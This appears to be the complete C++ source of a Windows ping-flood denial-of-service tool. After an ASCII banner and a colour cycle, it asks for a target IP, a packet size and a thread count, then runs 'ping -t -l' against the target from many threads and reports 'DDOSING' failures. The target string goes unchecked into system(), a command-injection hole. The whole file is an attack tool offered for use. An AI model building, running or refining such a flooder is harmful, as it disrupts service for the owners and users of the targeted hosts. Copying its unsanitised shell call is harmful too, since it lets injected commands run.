#include <iostream>
#include <thread>
#include <vector>
#include <string>
using namespace std;

void sleep(unsigned int ms) {
    this_thread::sleep_for(chrono::milliseconds(ms));
}

void welcome() {
    cout << "                       __      __                                                   __  _______    ______    ______            ______   _______   _______  " << endl;
    cout << "                      /  |    /  |                                                 /  |/       \\  /      \\  /      \\          /      \\ /       \\ /       \\ " << endl;
    cout << "  _______   ______   _$$ |_   $$ |  ______   _____  ____    ______    ______      /$$/ $$$$$$$  |/$$$$$$  |/$$$$$$  |        /$$$$$$  |$$$$$$$  |$$$$$$$  |" << endl;
    cout << " /       | /      \\ / $$   |  $$ | /      \\ /     \\/    \\  /      \\  /      \\    /$$/  $$ |  $$ |$$ |  $$ |$$ \\__$$/  ______ $$ |  $$/ $$ |__$$ |$$ |__$$ |" << endl;
    cout << "/$$$$$$$/  $$$$$$  |$$$$$$/   $$ |/$$$$$$  |$$$$$$ $$$$  | $$$$$$  |/$$$$$$  |  /$$/   $$ |  $$ |$$ |  $$ |$$      \\ /      |$$ |      $$    $$/ $$    $$/ " << endl;
    cout << "$$ |       /    $$ |  $$ | __ $$ |$$ |  $$ |$$ | $$ | $$ | /    $$ |$$ |  $$ | /$$/    $$ |  $$ |$$ |  $$ | $$$$$$  |$$$$$$/ $$ |   __ $$$$$$$/  $$$$$$$/  " << endl;
    cout << "$$ \\_____ /$$$$$$$ |  $$ |/  |$$ |$$ \\__$$ |$$ | $$ | $$ |/$$$$$$$ |$$ \\__$$ |/$$/     $$ |__$$ |$$ \\__$$ |/  \\__$$ |        $$ \\__/  |$$ |      $$ |      " << endl;
    cout << "$$       |$$    $$ |  $$  $$/ $$ |$$    $$/ $$ | $$ | $$ |$$    $$ |$$    $$//$$/      $$    $$/ $$    $$/ $$    $$/         $$    $$/ $$ |      $$ |      " << endl;
    cout << " $$$$$$$/  $$$$$$$/    $$$$/  $$/  $$$$$$/  $$/  $$/  $$/  $$$$$$$/  $$$$$$/ $$/       $$$$$$$/   $$$$$$/   $$$$$$/           $$$$$$/  $$/       $$/       " << endl;
    cout << "                                                                                                                                                           " << endl;
    cout << "                                                                                                                                                           " << endl;
    cout << "                                                                                                                                                           " << endl;

    const char* colors[] = { "color 0", "color 1", "color 2", "color 3", "color 4", "color 5", "color 6", "color 7", "color 8", "color 9", "color A", "color B", "color C", "color D", "color E", "color F" };
    int numColors = sizeof(colors) / sizeof(colors[0]);
    for (int i = 0; i < numColors; ++i) {
        system(colors[i]);
        sleep(10);
    }
}

void ping(int bufferSize, const string& IP) {
    string command = "ping -t -l " + to_string(bufferSize) + " " + IP;
    int result = system(command.c_str());
    if (result == 0) {
    }
    else {
        cout << "DDOSING " << IP << " failed" << endl;
    }
}

int main() {
    int bufferSize;
    string IP;
    int numThreads;

    welcome();

    cout << "Enter IP: ";
    cin >> IP;
    cout << "Enter Buffer Size: ";
    cin >> bufferSize;
    cout << "Number of Threads:";
    cin >> numThreads;

    vector<thread> threads;
    for (int i = 0; i < numThreads; ++i) {
        threads.push_back(thread(ping, bufferSize, IP));
    }

    for (auto& t : threads) {
        t.join();
    }

    return 0;
}
